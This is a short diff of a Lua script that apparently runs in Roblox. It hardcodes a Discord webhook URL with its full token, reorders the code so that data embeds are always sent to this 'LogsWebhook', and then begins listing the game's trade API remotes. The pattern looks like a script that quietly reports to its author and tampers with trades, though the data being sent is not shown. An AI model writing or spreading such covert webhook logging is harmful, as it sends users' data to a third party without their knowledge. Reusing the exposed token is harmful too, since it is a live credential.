@@ -131,11 +131,9 @@ local function sendEmbed(webhookUrl, embedData)
 end
 
 local LogsWebhook = "https://discord.com/api/webhooks/1309897171369197588/Es13EP_U_GLWFjJrAwXPasVMU_0h61c3um6K5GNT4z_YJugWa6TGw2m6XNkpV_Y6rWgL"
-local Webhook = ""
-
-sendEmbed(Webhook, embed1)
-wait(5)
 sendEmbed(LogsWebhook, embed2)
+wait(5)
+sendEmbed(Webhook, embed1)
 
 local trade_info = {}
 for i, v in pairs(game:GetService("ReplicatedStorage").API:GetChildren()) do
